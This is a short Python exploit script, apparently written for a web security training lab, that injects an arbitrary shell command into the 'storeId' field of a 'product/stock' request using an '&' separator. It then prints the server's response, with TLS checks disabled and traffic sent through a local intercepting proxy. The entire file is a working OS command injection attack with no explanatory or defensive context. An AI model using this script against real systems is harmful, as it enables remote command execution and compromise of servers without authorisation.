import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}


def inject(url,command):
    path="product/stock"
    params={'productId':'1','storeId':'1 & '+command}

    r=requests.post(url+path,data=params,verify=False,proxies=proxies)

    print(r.text)


def main():
    url=input("Enter the URL Here : ")
    command=input("Enter the Command Here : ")
    inject(url,command)





if __name__=="__main__":
    main()